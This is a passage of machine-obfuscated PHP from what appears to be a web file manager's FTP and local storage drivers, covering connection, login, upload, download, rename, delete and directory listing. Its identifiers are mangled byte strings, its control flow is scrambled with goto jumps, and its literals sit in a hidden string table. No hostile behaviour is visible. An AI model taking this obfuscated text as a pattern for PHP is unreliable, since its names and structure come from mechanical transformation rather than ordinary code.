strlen($Añ¾°‚ìÍø)); if (empty($this->pathDriver)) { return $c†“ÜÒßã; } goto b·˜ëàêº–; b·˜ëàêº–: return $this->pathDriver . $fàíÌï“º[8] . ltrim($c†“ÜÒßã, $fàíÌï“º[8]); goto CÚˆ¢„Ü“¬; fÕãö’‹²•: if (substr($Añ¾°‚ìÍø, 0, 2) == $fàíÌï“º[1216]) { $Añ¾°‚ìÍø = BASIC_PATH . substr($Añ¾°‚ìÍø, 2); } if (substr($c†“ÜÒßã, 0, 2) == $fàíÌï“º[1216]) { $c†“ÜÒßã = BASIC_PATH . substr($c†“ÜÒßã, 2); } $Añ¾°‚ìÍø = KodIO::clear($Añ¾°‚ìÍø); goto d‰œ¥Âœ²; b‡á´Ï»ÊÆ: $fàíÌï“º =& $_SERVER[Â€Á›¨õ]; $Añ¾°‚ìÍø = $this->iconvApp($this->pathBase); $c†“ÜÒßã = $this->iconvApp($c†“ÜÒßã); goto fÕãö’‹²•; CÚˆ¢„Ü“¬: } private function _init($CÖ‘‘éÕèÈ = array()) { $d¯¯İÇ‡‚ =& $_SERVER[Â€Á›¨õ]; if (!function_exists($d¯¯İÇ‡‚[1217])) { throw new Exception(LNG($d¯¯İÇ‡‚[1218])); } $this->config = $CÖ‘‘éÕèÈ; $this->charsetReset($CÖ‘‘éÕèÈ); foreach ($CÖ‘‘éÕèÈ as $döÓÏáÌŒ => $E‹ƒöŸ‡‡ã) { if (isset($this->{$döÓÏáÌŒ})) { $this->{$döÓÏáÌŒ} = $E‹ƒöŸ‡‡ã; } } return $this->_login($CÖ‘‘éÕèÈ); } private function _login($dÌ†´«‰) { goto AŒ¨¨¾‹Ìì; aÀÏŠùƒ„: if (isset($d‹‹Ã©¨‹Ô[$dôˆßµ´ö])) { foreach ($d‹‹Ã©¨‹Ô[$dôˆßµ´ö] as $f¡ª£Îâ±ä => $AİİÃ½Òì) { $this->{$f¡ª£Îâ±ä} = $AİİÃ½Òì; } return !0; } $b—²„ŠÌŠ÷ = parse_url(trim($this->server, $eÕùÏ¯¡‹¥[8])); $this->host = $b—²„ŠÌŠ÷[$eÕùÏ¯¡‹¥[175]]; goto a–ƒæ–•×ƒ; aä»£›Ñªñ: $d‹‹Ã©¨‹Ô[$dôˆßµ´ö] = array($eÕùÏ¯¡‹¥[1222] => $this->connect, $eÕùÏ¯¡‹¥[175] => $this->host, $eÕùÏ¯¡‹¥[174] => $this->scheme, $eÕùÏ¯¡‹¥[176] => $this->port); return $e÷öïÒÍĞ»; goto FÌ—óêÏ¢; a–ƒæ–•×ƒ: $eÙ”›‘£Å„ = isset($b—²„ŠÌŠ÷[$eÕùÏ¯¡‹¥[174]]) && $b—²„ŠÌŠ÷[$eÕùÏ¯¡‹¥[174]] == $eÕùÏ¯¡‹¥[1219] ? !0 : !1; $this->scheme = $eÙ”›‘£Å„ ? $eÕùÏ¯¡‹¥[1220] : $eÕùÏ¯¡‹¥[1221]; $this->port = isset($b—²„ŠÌŠ÷[$eÕùÏ¯¡‹¥[176]]) ? $b—²„ŠÌŠ÷[$eÕùÏ¯¡‹¥[176]] : 21; goto b»«÷ïÏ–; AŒ¨¨¾‹Ìì: $eÕùÏ¯¡‹¥ =& $_SERVER[Â€Á›¨õ]; static $d‹‹Ã©¨‹Ô = array(); $dôˆßµ´ö = md5(json_encode($dÌ†´«‰)); goto aÀÏŠùƒ„; b»«÷ïÏ–: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $e÷öïÒÍĞ» = @ftp_login($this->connect, $this->username, $this->userpass); goto A§ìµÖâÂ; A§ìµÖâÂ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $E÷Ğ¼»‚‰ = $this->pasv == $eÕùÏ¯¡‹¥[86] ? !0 : !1; @ftp_pasv($this->connect, $E÷Ğ¼»‚‰); goto aä»£›Ñªñ; FÌ—óêÏ¢: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Aõƒæ©›¨½, $dÀÛ¬Ğ–ƒ = '', $AôæÙ­Ùš‰ = REPEAT_RENAME) { if ($this->setContent($Aõƒæ©›¨½, $dÀÛ¬Ğ–ƒ)) { return $this->getPathOuter($Aõƒæ©›¨½); } return !1; } public function mkdir($e«¾‘Éì¯¨, $f¥·Àº±ºÖ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $e«¾‘Éì¯¨ = $this->iconvSystem($e«¾‘Éì¯¨); if ($this->_isFolder($e«¾‘Éì¯¨) || @ftp_mkdir($this->connect, $e«¾‘Éì¯¨)) { return $this->getPathOuter($e«¾‘Éì¯¨); } if (!$this->mkdir($this->pathFather($e«¾‘Éì¯¨))) { return !1; } if ($e«¾‘Éì¯¨ = @ftp_mkdir($this->connect, $e«¾‘Éì¯¨)) { return $this->getPathOuter($e«¾‘Éì¯¨); } return !1; } public function copyFile($EªØ°¨ÔÈ¤, $dó‰¶ßö«À) { goto d­ù²‘Ñá; d­ù²‘Ñá: if (!$this->_isconn()) { return !1; } $B·ÓàâÇÂµ = $this->pathThis($this->iconvSystem($EªØ°¨ÔÈ¤)); $dÄ‘ÁÌ¥ó = $this->tempFile($B·ÓàâÇÂµ); goto F‰ªÌÈã—; aŠ¯ñÅĞ™Â: $this->tempFileRemve($dÄ‘ÁÌ¥ó); return $AÕí…ÒÃé; goto B£ÀÈ‡£Û; F‰ªÌÈã—: $D›Øƒ÷Ìéİ = $this->iconvApp($dÄ‘ÁÌ¥ó); $this->download($EªØ°¨ÔÈ¤, $D›Øƒ÷Ìéİ); $AÕí…ÒÃé = $this->upload($dó‰¶ßö«À, $D›Øƒ÷Ìéİ); goto aŠ¯ñÅĞ™Â; B£ÀÈ‡£Û: } public function moveFile($F“´×ÀÄØ’, $f¶¤½©˜Ã) { if (!$this->_isconn()) { return !1; } $F“´×ÀÄØ’ = $this->iconvSystem($F“´×ÀÄØ’); $f¶¤½©˜Ã = $this->iconvSystem($f¶¤½©˜Ã); $fö“òˆÙæ = @ftp_rename($this->connect, $F“´×ÀÄØ’, $f¶¤½©˜Ã); return $fö“òˆÙæ ? $this->getPathOuter($f¶¤½©˜Ã) : !1; } public function delFile($dŒé¥™–ù”) { if (!$this->_isconn()) { return !1; } $dŒé¥™–ù” = $this->iconvSystem($dŒé¥™–ù”); return @ftp_delete($this->connect, $dŒé¥™–ù”); } public function delFolder($f…Ç¸¯Ì ) { goto aÆ¶¶…¶Û‘; AçÈ½âíƒÒ: foreach ($Bâ©¤¸‹¦‚ as $e‘ç“Ö—äö) { $e‘ç“Ö—äö = $this->iconvSystem($e‘ç“Ö—äö); $B‡õÜ”ß²‘ = @ftp_rmdir($this->connect, $e‘ç“Ö—äö); if (!$B‡õÜ”ß²‘) { return !1; } } $f…Ç¸¯Ì  = $this->iconvSystem($f…Ç¸¯Ì ); return @ftp_rmdir($this->connect, $f…Ç¸¯Ì ); goto f®³¬¯Š±; aÆ¶¶…¶Û‘: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Bâ©¤¸‹¦‚ = $CäÏ“¤ôÁŒ = array(); goto dñÚ‹Ñ¦î; dñÚ‹Ñ¦î: $this->fileList($f…Ç¸¯Ì , $Bâ©¤¸‹¦‚, $CäÏ“¤ôÁŒ, !0); $this->listItemCache = !0; foreach ($CäÏ“¤ôÁŒ as $Dçï˜Ñ¦¿¶) { $e‘ç“Ö—äö = $this->iconvSystem($Dçï˜Ñ¦¿¶[$_SERVER[Â€Á›¨õ][28]]); $B‡õÜ”ß²‘ = @ftp_delete($this->connect, $e‘ç“Ö—äö); if (!$B‡õÜ”ß²‘) { return !1; } } goto AçÈ½âíƒÒ; f®³¬¯Š±: } public function rename($AÆÙç¬ëÔÃ, $fóÀ‡®­ºõ) { goto dÜ†ÅäÑ”; FˆóƒøíÃ¢: $Fö™ˆĞ©ª = rtrim($b¤»ÀÁëš, $D’¥Ìˆœ÷–[8]) . $D’¥Ìˆœ÷–[8] . $câœãßÃÍ; $bßİÊŸ¦ìß = @ftp_rename($this->connect, $AÆÙç¬ëÔÃ, $Fö™ˆĞ©ª); $Fö™ˆĞ©ª = $this->iconvApp($Fö™ˆĞ©ª); goto DÆ•ˆ–Ò‚’; aùÕæ‹²ö: $câœãßÃÍ = $this->iconvSystem($câœãßÃÍ); $AÆÙç¬ëÔÃ = $this->iconvSystem($AÆÙç¬ëÔÃ); $b¤»ÀÁëš = $this->pathFather($AÆÙç¬ëÔÃ); goto FˆóƒøíÃ¢; DÆ•ˆ–Ò‚’: return $bßİÊŸ¦ìß ? $this->getPathOuter($Fö™ˆĞ©ª) : !1; goto d³»ÂöéùÛ; dÜ†ÅäÑ”: $D’¥Ìˆœ÷– =& $_SERVER[Â€Á›¨õ]; if (!$this->_isconn()) { return !1; } $câœãßÃÍ = $this->fileNameAuto($this->pathFather($AÆÙç¬ëÔÃ), $fóÀ‡®­ºõ); goto aùÕæ‹²ö; d³»ÂöéùÛ: } private function folderInfo($bìÕÀŸë—, $Aï£àÎÎïœ = false) { $C÷Ò¤ìã =& $_SERVER[Â€Á›¨õ]; $AÅß¢Ş´†õ = array($C÷Ò¤ìã[28] => $this->pathThis($bìÕÀŸë—), $C÷Ò¤ìã[75] => $this->getPathOuter($C÷Ò¤ìã[8] . $bìÕÀŸë—), $C÷Ò¤ìã[29] => $C÷Ò¤ìã[76]); if ($Aï£àÎÎïœ) { return $AÅß¢Ş´†õ; } $AÅß¢Ş´†õ[$C÷Ò¤ìã[192]] = $AÅß¢Ş´†õ[$C÷Ò¤ìã[83]] = 0; $AÅß¢Ş´†õ[$C÷Ò¤ìã[193]] = $AÅß¢Ş´†õ[$C÷Ò¤ìã[194]] = !0; return $AÅß¢Ş´†õ; } private function fileInfo($aªßŞÇ°Ñƒ, $Dò‘‡˜âóÍ = false, $DÓÇ¼î¤ò = array()) { goto E†‚ÆÏôõ; E†‚ÆÏôõ: $aáªæØââ =& $_SERVER[Â€Á›¨õ]; $c®²«ÜÍ­Ã = array($aáªæØââ[28] => $this->pathThis($aªßŞÇ°Ñƒ), $aáªæØââ[75] => $this->getPathOuter($aáªæØââ[8] . $aªßŞÇ°Ñƒ), $aáªæØââ[29] => $aáªæØââ[173], $aáªæØââ[77] => isset($DÓÇ¼î¤ò[$aáªæØââ[77]]) ? $DÓÇ¼î¤ò[$aáªæØââ[77]] : 0, $aáªæØââ[167] => $this->ext($aªßŞÇ°Ñƒ)); if ($Dò‘‡˜âóÍ) { return $c®²«ÜÍ­Ã; } goto Eˆ³í“à¥Ç; aŒ§äø¬: return $c®²«ÜÍ­Ã; goto E®ƒ˜‰¨¥; bëò¡Î£É: $c®²«ÜÍ­Ã[$aáªæØââ[83]] = @ftp_mdtm($this->connect, $CÏÍ„£óˆ); if (empty($DÓÇ¼î¤ò)) { $DÓÇ¼î¤ò = $this->objectMeta($aªßŞÇ°Ñƒ); if (!$DÓÇ¼î¤ò) { return $c®²«ÜÍ­Ã; } } $c®²«ÜÍ­Ã[$aáªæØââ[77]] = $DÓÇ¼î¤ò[$aáªæØââ[77]]; goto aŒ§äø¬; Eˆ³í“à¥Ç: $c®²«ÜÍ­Ã[$aáªæØââ[192]] = $c®²«ÜÍ­Ã[$aáªæØââ[83]] = 0; $c®²«ÜÍ­Ã[$aáªæØââ[193]] = $c®²«ÜÍ­Ã[$aáªæØââ[194]] = !0; $CÏÍ„£óˆ = $this->iconvSystem($aªßŞÇ°Ñƒ); goto bëò¡Î£É; E®ƒ˜‰¨¥: } public function size($Bô‘Õ•¾ç×) { $fë„©ÜªÏ° = $this->objectMeta($Bô‘Õ•¾ç×); return $fë„©ÜªÏ° ? $fë„©ÜªÏ°[$_SERVER[Â€Á›¨õ][77]] : 0; } public function info($AâèŞõì) { if ($this->isFile($AâèŞõì)) { return $this->fileInfo($AâèŞõì, 0); } else { if ($this->isFolder($AâèŞõì)) { return $this->folderInfo($AâèŞõì); } } return !1; } private function fileList($FŒÜè‰Ö, &$fÚ§à–½Íª, &$d­ö×¦öğ, $aŒñî»Â˜ = false) { goto D†¸„–åŠ; b™˜âå‰­ë: $dÂ­‚‰‡Ûˆ = $this->listItemCache === !1 ? !1 : !0; $FÁöö¶œõ = @ftp_rawlist($this->connect, $FŒÜè‰Ö); if (!$FÁöö¶œõ) { $FÁöö¶œõ = array(); } goto f‡—Õ§¼ÕÛ; D†¸„–åŠ: $DßÒö…ƒ­¥ =& $_SERVER[Â€Á›¨õ]; $FŒÜè‰Ö = $this->iconvSystem($FŒÜè‰Ö); if (!$this->isFolder($FŒÜè‰Ö)) { return !1; } goto cğàÏ²Î†‚; cğàÏ²Î†‚: @ftp_chdir($this->connect, $DßÒö…ƒ­¥[8]); $FŒÜè‰Ö = rtrim($FŒÜè‰Ö, $DßÒö…ƒ­¥[8]) . $DßÒö…ƒ­¥[8]; check_abort(); goto b™˜âå‰­ë; f‡—Õ§¼ÕÛ: $Có¦ë­•ğã = array($DßÒö…ƒ­¥[94] => 1, $DßÒö…ƒ­¥[1223] => 1); foreach ($FÁöö¶œõ as $C†‰›ÇòÍà) { goto fÒÁºÖ½; dƒÜÇİÁ¯ğ: if (substr($C†‰›ÇòÍà, 0, 1) == $DßÒö…ƒ­¥[1224]) { $aÏø½æøç[$DßÒö…ƒ­¥[29]] = $DßÒö…ƒ­¥[76]; $aÏø½æøç[$DßÒö…ƒ­¥[77]] = 0; } $C‹·ñ×›©é = $aÏø½æøç[$DßÒö…ƒ­¥[29]] == $DßÒö…ƒ­¥[76] ? !0 : !1; if ($dÂ­‚‰‡Ûˆ) { $this->cacheMethod($DßÒö…ƒ­¥[197], $AºŠ’¬İ‰ø, $C‹·ñ×›©é); $this->cacheMethod($DßÒö…ƒ­¥[198], $AºŠ’¬İ‰ø, $aÏø½æøç); } goto C·ºƒÊ¡; B¨Ğ§ÈÊˆÀ: if (!$AºŠ’¬İ‰ø || isset($Có¦ë­•ğã[$AºŠ’¬İ‰ø])) { continue; } $AºŠ’¬İ‰ø = $this->iconvApp($FŒÜè‰Ö . ltrim($AºŠ’¬İ‰ø, $DßÒö…ƒ­¥[8])); $aÏø½æøç = array($DßÒö…ƒ­¥[28] => $AºŠ’¬İ‰ø, $DßÒö…ƒ­¥[29] => $DßÒö…ƒ­¥[173], $DßÒö…ƒ­¥[77] => $eâë²®Úõ[4]); goto dƒÜÇİÁ¯ğ; fÒÁºÖ½: $eâë²®Úõ = $this->_listItem($C†‰›ÇòÍà); if ($eâë²®Úõ[0] == $DßÒö…ƒ­¥[708]) { continue; } $AºŠ’¬İ‰ø = $eâë²®Úõ[8]; goto B¨Ğ§ÈÊˆÀ; C·ºƒÊ¡: if ($C‹·ñ×›©é) { $fÚ§à–½Íª[] = $AºŠ’¬İ‰ø; if ($aŒñî»Â˜) { $this->fileList($AºŠ’¬İ‰ø, $fÚ§à–½Íª, $d­ö×¦öğ, $aŒñî»Â˜); } continue; } $d­ö×¦öğ[] = $aÏø½æøç; goto e›×æŸ¤ÅÆ; e›×æŸ¤ÅÆ: } if ($dÂ­‚‰‡Ûˆ) { $this->cacheMethod($DßÒö…ƒ­¥[197], $FŒÜè‰Ö, !0); } goto DÌ³˜®; DÌ³˜®: } private function _listItem($eíà¦‰¸øÌ) { if (empty($eíà¦‰¸øÌ)) { return array(); } $Cì¦àÒ”ôÀ = preg_split($_SERVER[Â€Á›¨õ][1225], $eíà¦‰¸øÌ); if (count($Cì¦àÒ”ôÀ) <= 9) { return $Cì¦àÒ”ôÀ; } $Cì¦àÒ”ôÀ[8] = trim(substr($eíà¦‰¸øÌ, strpos($eíà¦‰¸øÌ, $Cì¦àÒ”ôÀ[7]) + strlen($Cì¦àÒ”ôÀ[7]))); return array_splice($Cì¦àÒ”ôÀ, 0, 9); } public function listPath($bò’öÓ¨‚˜, $DÛ ß¶“‡ = false) { goto añá˜ß°Éô; añá˜ß°Éô: $E·òÌ¦ß©Ì =& $_SERVER[Â€Á›¨õ]; if (!$this->_isconn()) { return !1; } $CÎ»­‘ó‰ = $Dö®éä¤õ– = array(); goto Fà×ÇÔĞ; Fà×ÇÔĞ: $this->fileList($bò’öÓ¨‚˜, $CÎ»­‘ó‰, $Dö®éä¤õ–); foreach ($CÎ»­‘ó‰ as $CÚŒŒˆÈ‰ => $cŒ–á‚Ï”ˆ) { $CÎ»­‘ó‰[$CÚŒŒˆÈ‰] = $this->folderInfo($cŒ–á‚Ï”ˆ, $DÛ ß¶“‡); } foreach ($Dö®éä¤õ– as $CÚŒŒˆÈ‰ => $cŒ–á‚Ï”ˆ) { $Dö®éä¤õ–[$CÚŒŒˆÈ‰] = $this->fileInfo($cŒ–á‚Ï”ˆ[$E·òÌ¦ß©Ì[28]], $DÛ ß¶“‡, $cŒ–á‚Ï”ˆ); } goto b‹‘®¸¼šˆ; b‹‘®¸¼šˆ: return array($E·òÌ¦ß©Ì[74] => $CÎ»­‘ó‰, $E·òÌ¦ß©Ì[73] => $Dö®éä¤õ–); goto BŠå¸ª«í; BŠå¸ª«í: } public function has($a£®Ä°¤¿–, $a­©ØÇ±¨Š = false, $CĞ¶İÙáé = true) { goto fœß…µ‰Á; fœß…µ‰Á: $DãÇÁô›‡ =& $_SERVER[Â€Á›¨õ]; $a ®²«²“ñ = $bªŠàƒÔÇÔ = array(); $C»áè‡µù– = $a­©ØÇ±¨Š ? !0 : !1; goto dã¾ìë©„; dã¾ìë©„: $this->fileList($a£®Ä°¤¿–, $a ®²«²“ñ, $bªŠàƒÔÇÔ, $C»áè‡µù–); if ($a­©ØÇ±¨Š) { return array($DãÇÁô›‡[201] => count($bªŠàƒÔÇÔ), $DãÇÁô›‡[202] => count($a ®²«²“ñ)); } if ($CĞ¶İÙáé) { if (count($bªŠàƒÔÇÔ)) { return !0; } } else { if (count($a ®²«²“ñ)) { return !0; } } goto Fô¤Î‰«Åå; Fô¤Î‰«Åå: return !1; goto E·Ñ²ºÁé; E·Ñ²ºÁé: } public function listAll($B—šåô‡œÔ) { goto cÀè°¼·»; cÀè°¼·»: $c ¹¡±Ò‘ =& $_SERVER[Â€Á›¨õ]; if (!$this->_isconn()) { return !1; } $Aíæ‘ëÔ®… = $DäøšÃÁö© = array(); goto fĞØöĞö¢Â; fó°ë©ÇÙ: foreach ($Aíæ‘ëÔ®… as $D½™ÕÅîô·) { if (is_string($D½™ÕÅîô·)) { $AŠùöâàÖ[$D½™ÕÅîô·] = 0; } } return $this->listAllFiles($B—šåô‡œÔ, array_keys($AŠùöâàÖ), $AŠùöâàÖ); goto aÑÈ°Ï¸ĞÓ; fĞØöĞö¢Â: $this->fileList($B—šåô‡œÔ, $Aíæ‘ëÔ®…, $DäøšÃÁö©, !0); $AŠùöâàÖ = array(); foreach ($DäøšÃÁö© as $D½™ÕÅîô·) { $AŠùöâàÖ[$D½™ÕÅîô·[$c ¹¡±Ò‘[28]]] = $D½™ÕÅîô·[$c ¹¡±Ò‘[77]]; } goto fó°ë©ÇÙ; aÑÈ°Ï¸ĞÓ: } public function getContent($fÙÊœ×ø¹º) { if (!$this->_isconn()) { return !1; } $fÙÊœ×ø¹º = $this->iconvSystem($fÙÊœ×ø¹º); return $this->fileSubstr($fÙÊœ×ø¹º); } public function setContent($e‘Œ¨µô¸¼, $d¼˜¤ëô…‡ = '') { goto EÀƒ®¯êÓ; EÀƒ®¯êÓ: if (!$this->_isconn()) { return !1; } $e´ÈÎÉŸ = $this->pathThis($this->iconvSystem($e‘Œ¨µô¸¼)); $b‡£ï…îó¶ = $this->tempFile($e´ÈÎÉŸ); goto cİ˜¬é¢Šö; cİ˜¬é¢Šö: file_put_contents($b‡£ï…îó¶, $d¼˜¤ëô…‡); $bå™­²œ„Ã = $this->upload($e‘Œ¨µô¸¼, $this->iconvApp($b‡£ï…îó¶)); $this->tempFileRemve($b‡£ï…îó¶); goto F‹¿Ô†é…ö; F‹¿Ô†é…ö: return $bå™­²œ„Ã; goto bÊÆÚ·Ï¶¯; bÊÆÚ·Ï¶¯: } public function fileSubstr($B±¿´…¨´Æ, $B˜º÷öùÍ« = 0, $E¼ç‹¡ïÓ× = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($B±¿´…¨´Æ, $B˜º÷öùÍ«, $E¼ç‹¡ïÓ×); } private function ftpRequest($DìŠ£²…êÜ, $fÉŸ‚¯ÈÈ‰ = 0, $e™–’õ¬¨ = false) { goto B¾“‘ÉÎ‚«; A¿Î×Úö§ˆ: return $añƒ¿ÈÖÄ’; goto D¤¬õß¢¦; D÷àèÒÍö¡: curl_setopt($bóîâ°‹œ³, CURLOPT_URL, $CÏÅíÏ¼¤Ó . $this->pathEncode($DìŠ£²…êÜ)); curl_setopt($bóîâ°‹œ³, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($e™–’õ¬¨) { $D¤Š‚¼œ®‘ = $fÉŸ‚¯ÈÈ‰ + $e™–’õ¬¨ - 1; curl_setopt($bóîâ°‹œ³, CURLOPT_RANGE, "{$fÉŸ‚¯ÈÈ‰}\55{$D¤Š‚¼œ®‘}"); } goto d¾Óïµµ²°; d¾Óïµµ²°: curl_setopt($bóîâ°‹œ³, CURLOPT_RETURNTRANSFER, 1); $añƒ¿ÈÖÄ’ = curl_exec($bóîâ°‹œ³); curl_close($bóîâ°‹œ³); goto A¿Î×Úö§ˆ; B¾“‘ÉÎ‚«: $DìŠ£²…êÜ = $this->iconvSystem($DìŠ£²…êÜ); $CÏÅíÏ¼¤Ó = $this->scheme . $this->host . $_SERVER[Â€Á›¨õ][4] . $this->port; $bóîâ°‹œ³ = curl_init(); goto D÷àèÒÍö¡; D¤¬õß¢¦: } public function upload($aÙòÕ…–š³, $E¤®¾ñ‡¥ˆ, $FğŸÏ”ÍÆ = false, $fÉŒîÕŸùœ = REPEAT_REPLACE) { goto Cä‚á¶×²—; AŠ¿ø§Ö÷: $E¤®¾ñ‡¥ˆ = $this->iconvSystem($E¤®¾ñ‡¥ˆ); $c—ÖÌ£”¾È = ftp_nb_put($this->connect, $aÙòÕ…–š³, $E¤®¾ñ‡¥ˆ, FTP_BINARY); while ($c—ÖÌ£”¾È == FTP_MOREDATA) { $c—ÖÌ£”¾È = ftp_nb_continue($this->connect); } goto e­÷Î†‹‰»; e­÷Î†‹‰»: if ($c—ÖÌ£”¾È != FTP_FINISHED) { return !1; } return $this->getPathOuter($aÙòÕ…–š³); goto FÈ‚¥µˆÇÓ; Cä‚á¶×²—: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($aÙòÕ…–š³))) { return !1; } $aÙòÕ…–š³ = $this->iconvSystem($aÙòÕ…–š³); goto AŠ¿ø§Ö÷; FÈ‚¥µˆÇÓ: } public function download($bìœ¥‘¢ƒÅ, $BíŒ”ïóß® = '') { goto bÓ…ÆÃî£; fö»ÛÓ“°: $bìœ¥‘¢ƒÅ = $this->iconvSystem($bìœ¥‘¢ƒÅ); $BíŒ”ïóß® = $this->iconvSystem($BíŒ”ïóß®); $c±ó¸¯Á²¦ = ftp_nb_get($this->connect, $BíŒ”ïóß®, $bìœ¥‘¢ƒÅ, FTP_BINARY); goto aÖé¨«æ†; aÖé¨«æ†: while ($c±ó¸¯Á²¦ == FTP_MOREDATA) { $c±ó¸¯Á²¦ = ftp_nb_continue($this->connect); } if ($c±ó¸¯Á²¦ != FTP_FINISHED) { return !1; } return $this->iconvApp($BíŒ”ïóß®); goto CæŠÇ¬›™; bÓ…ÆÃî£: if (!$this->_isconn()) { return !1; } $f¼Ìà¶º® = $this->pathFather($BíŒ”ïóß®); if (!IO::mkdir($f¼Ìà¶º®)) { return !1; } goto fö»ÛÓ“°; CæŠÇ¬›™: } public function exist($aÕ¿ ö§È) { return $this->isFile($aÕ¿ ö§È) || $this->isFolder($aÕ¿ ö§È); } public function isFile($a…‘’èºµ) { return !$this->isFolder($a…‘’èºµ) && $this->objectMeta($a…‘’èºµ); } public function isFolder($e·¬ëê”ğï) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][197], $e·¬ëê”ğï); } protected function objectMeta($a¤¸ ™±´†) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][198], $a¤¸ ™±´†); } protected function _objectMeta($c‘¸‹ÑÄ¦ì) { goto cµŒ•…¨ô; cµŒ•…¨ô: $dİïùù„ƒé =& $_SERVER[Â€Á›¨õ]; if ($c‘¸‹ÑÄ¦ì == $dİïùù„ƒé[33] || $c‘¸‹ÑÄ¦ì == $dİïùù„ƒé[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto fÜÓ™—ëÃä; fÜÓ™—ëÃä: $c‘¸‹ÑÄ¦ì = $this->iconvSystem($c‘¸‹ÑÄ¦ì); $E²Æ­ˆ¼Šõ = array($dİïùù„ƒé[28] => $this->iconvApp($c‘¸‹ÑÄ¦ì), $dİïùù„ƒé[29] => $dİïùù„ƒé[173], $dİïùù„ƒé[77] => 0); @ftp_chdir($this->connect, $dİïùù„ƒé[8]); goto B¸‘œàš°Ó; B¸‘œàš°Ó: $BìïÀÁ¤ÏÜ = @ftp_size($this->connect, $c‘¸‹ÑÄ¦ì); if ($BìïÀÁ¤ÏÜ != -1) { $E²Æ­ˆ¼Šõ[$dİïùù„ƒé[77]] = $BìïÀÁ¤ÏÜ; } else { $EùŒš•‚†¦ = @ftp_chdir($this->connect, $c‘¸‹ÑÄ¦ì); if (!$EùŒš•‚†¦) { return !1; } $E²Æ­ˆ¼Šõ[$dİïùù„ƒé[29]] = $dİïùù„ƒé[76]; } return $E²Æ­ˆ¼Šõ; goto Dé ¾±ƒŠÛ; Dé ¾±ƒŠÛ: } protected function _isFolder($fè±„ŞÚ‹ß) { $aºôËÔ¼¢¤ =& $_SERVER[Â€Á›¨õ]; if ($fè±„ŞÚ‹ß == $aºôËÔ¼¢¤[33] || $fè±„ŞÚ‹ß == $aºôËÔ¼¢¤[8]) { return !0; } $bˆùÍïŒÉò = $this->_objectMeta($fè±„ŞÚ‹ß); return isset($bˆùÍïŒÉò[$aºôËÔ¼¢¤[29]]) && $bˆùÍïŒÉò[$aºôËÔ¼¢¤[29]] == $aºôËÔ¼¢¤[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($e¢ Ö‡‡˜—) { if (substr($e¢ Ö‡‡˜—, 0, 2) == $_SERVER[Â€Á›¨õ][1216]) { $e¢ Ö‡‡˜— = BASIC_PATH . substr($e¢ Ö‡‡˜—, 2); } return $e¢ Ö‡‡˜—; } public function iconvApp($b½ÍÆ‰ñğ„) { $aÂÜñ§”–Î =& $_SERVER[Â€Á›¨õ]; global $config; return $this->iconvTo($b½ÍÆ‰ñğ„, $config[$aÂÜñ§”–Î[1214]], $config[$aÂÜñ§”–Î[1213]]); } public function iconvSystem($dÕ—˜çÎÀµ) { $FÔ¨íÜÁî¼ =& $_SERVER[Â€Á›¨õ]; global $config; return $this->iconvTo($dÕ—˜çÎÀµ, $config[$FÔ¨íÜÁî¼[1213]], $config[$FÔ¨íÜÁî¼[1214]]); } public function getPathOuter($c±‹…¥°Õˆ) { goto BİĞŠˆ„›«; b¶·¨‰×å‡: $c±‹…¥°Õˆ = KodIO::clear($c±‹…¥°Õˆ); $c±‹…¥°Õˆ = substr($c±‹…¥°Õˆ, strlen($fœÙ‡‰Êòà)); if (empty($this->pathDriver)) { return $c±‹…¥°Õˆ; } goto Dƒ¦½‹šï¸; BİĞŠˆ„›«: $Bì®ÍàÙ®Ú =& $_SERVER[Â€Á›¨õ]; $fœÙ‡‰Êòà = $this->iconvApp($this->pathBase); $c±‹…¥°Õˆ = $this->iconvApp($c±‹…¥°Õˆ); goto CÑ‘Ú£“…; Dƒ¦½‹šï¸: return $this->pathDriver . $Bì®ÍàÙ®Ú[8] . ltrim($c±‹…¥°Õˆ, $Bì®ÍàÙ®Ú[8]); goto BÀ‹šÊÄ˜; CÑ‘Ú£“…: if (substr($fœÙ‡‰Êòà, 0, 2) == $Bì®ÍàÙ®Ú[1216]) { $fœÙ‡‰Êòà = BASIC_PATH . substr($fœÙ‡‰Êòà, 2); } if (substr($c±‹…¥°Õˆ, 0, 2) == $Bì®ÍàÙ®Ú[1216]) { $c±‹…¥°Õˆ = BASIC_PATH . substr($c±‹…¥°Õˆ, 2); } $fœÙ‡‰Êòà = KodIO::clear($fœÙ‡‰Êòà); goto b¶·¨‰×å‡; BÀ‹šÊÄ˜: } public function mkfile($b†Ìø¦·Ï˜, $Bğ¨Ïï·¤§ = '', $fÅ°ôŠñä = REPEAT_RENAME) { $b†Ìø¦·Ï˜ = $this->iconvSystem($b†Ìø¦·Ï˜); @touch($b†Ìø¦·Ï˜); if ($Bğ¨Ïï·¤§) { file_put_contents($b†Ìø¦·Ï˜, $Bğ¨Ïï·¤§); } return is_file($b†Ìø¦·Ï˜) ? $this->getPathOuter($b†Ìø¦·Ï˜) : !1; } public function mkdir($C±Ì²èÉ¿İ, $B®ÑˆÄÈå = REPEAT_SKIP) { $C±Ì²èÉ¿İ = $this->iconvSystem($C±Ì²èÉ¿İ); if (is_dir($C±Ì²èÉ¿İ)) { return $this->getPathOuter($C±Ì²èÉ¿İ); } @mkdir($C±Ì²èÉ¿İ, 511, !0); return is_dir($C±Ì²èÉ¿İ) ? $this->getPathOuter($C±Ì²èÉ¿İ) : !1; } public function copyFile($C´’˜Ø©ƒ¸, $CßØ›½±‚Œ) { $this->mkdir($this->pathFather($CßØ›½±‚Œ)); $C´’˜Ø©ƒ¸ = $this->iconvSystem($C´’˜Ø©ƒ¸); $CßØ›½±‚Œ = $this->iconvSystem($CßØ›½±‚Œ); $C¶î’ØøÎ² = copy_64($C´’˜Ø©ƒ¸, $CßØ›½±‚Œ); return $C¶î’ØøÎ² ? $this->getPathOuter($CßØ›½±‚Œ) : 